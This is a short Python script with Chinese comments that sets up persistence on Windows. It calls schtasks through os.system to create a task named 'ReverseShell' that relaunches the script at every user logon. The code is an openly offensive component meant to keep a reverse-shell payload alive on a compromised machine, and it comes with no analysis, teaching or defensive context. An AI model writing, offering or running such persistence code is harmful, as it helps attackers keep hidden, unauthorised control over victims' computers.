import os
import sys

# 設置計劃任務，當 Windows 開機時自動執行 Python 腳本
def create_persistence():
    # 設定任務名稱和要執行的命令
    task_name = "ReverseShell"
    script_path = sys.argv[0]  # 目前的腳本路徑
    
    # 使用 Windows 的 schtasks 設置計劃任務
    os.system(f'schtasks /create /tn "{task_name}" /tr "python {script_path}" /sc onlogon /f')

# 執行持久化
create_persistence()
